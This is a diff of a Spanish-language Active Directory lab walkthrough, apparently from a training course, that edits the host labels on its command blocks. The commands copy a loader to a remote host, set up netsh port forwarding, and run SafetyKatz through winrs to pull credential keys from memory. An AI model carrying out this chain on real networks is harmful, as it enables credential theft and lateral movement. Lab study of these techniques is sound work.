@@ -649,7 +649,7 @@ Descubriendo que los tiene en *adminsrv* y *mgmt*
 
 Teniendo acceso de administrador local en esa maquina de dcorp-mgmt y sabemos que hay una sesión activa en esa maquina como es svcadmin usaremos SafetyKatz para extraer las credenciales de la maquina, copiando el Loader a dcorp-mgmt
 ```shell
-[student97]
+[adminsrv]
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
 ```
 
@@ -659,12 +659,14 @@ Haremos el renvió de puertos
 winrs -r:dcorp-adminsrv cmd
 ```
 
-```
+```shell
+[admninsrv]
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
 ```
 
 Y ejecutaremos el SafetKatz
 ```shell
+[Administrator ad srvadmin]
 winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
 ```
 
